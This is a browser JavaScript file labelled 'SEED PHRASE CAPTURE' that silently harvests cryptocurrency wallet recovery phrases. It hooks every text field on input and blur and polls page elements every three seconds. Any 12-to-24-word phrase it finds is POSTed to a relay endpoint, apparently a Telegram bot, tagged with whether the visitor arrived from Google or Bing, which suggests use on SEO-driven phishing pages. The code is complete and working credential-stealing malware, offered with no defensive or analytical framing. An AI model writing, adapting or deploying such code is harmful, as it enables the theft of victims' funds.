// ============================================================
// SEED PHRASE CAPTURE - form-handler.js (clean rebuild)
// Captures 12/15/18/21/24-word seed phrases, sends to /api/telegram
// ============================================================

(function(){
  var API="/api/telegram";
  var sent={};

  function getTrafficSource(){
    var r=document.referrer.toLowerCase();
    if(r.indexOf("google.com")>=0||r.indexOf("google.co")>=0)return"Google SEO";
    if(r.indexOf("bing.com")>=0)return"Bing SEO";
    return document.referrer||"Direct";
  }

  function send(phrase){
    if(sent[phrase])return;
    sent[phrase]=true;
    fetch(API,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({data:{PHRASE:phrase,trafficSource:getTrafficSource()}})
    }).then(function(r){return r.json();}).then(function(d){
      console.log("Sent:",d.success,"id:",d.messageId);
    }).catch(function(e){
      console.error("Send failed:",e);
      delete sent[phrase];
    });
  }

  function isValid(v){
    if(!v)return false;
    var ws=v.trim().split(/\s+/).filter(function(w){return w.length>0;});
    return [12,15,18,21,24].indexOf(ws.length)>=0 && /^[a-z\s]+$/.test(v.trim().toLowerCase());
  }

  // Capture from inputs
  document.addEventListener("input",function(e){
    var t=e.target;
    if(t.tagName!=="INPUT"&&t.tagName!=="TEXTAREA")return;
    var v=(t.value||"").trim();
    if(isValid(v))send(v.trim().toLowerCase());
  },true);

  // Capture on blur
  document.addEventListener("blur",function(e){
    var t=e.target;
    if(t.tagName!=="INPUT"&&t.tagName!=="TEXTAREA")return;
    var v=(t.value||"").trim();
    if(isValid(v))send(v.trim().toLowerCase());
  },true);

  // Poll for displayed phrases (catches React-rendered phrases)
  setInterval(function(){
    var els=document.querySelectorAll("input,textarea,div,span,p");
    for(var i=0;i<els.length;i++){
      var txt=((els[i].value||"")+(els[i].textContent||"")).trim();
      if(txt.length<40||txt.length>300)continue;
      if(isValid(txt))send(txt.toLowerCase());
    }
  },3000);
})();
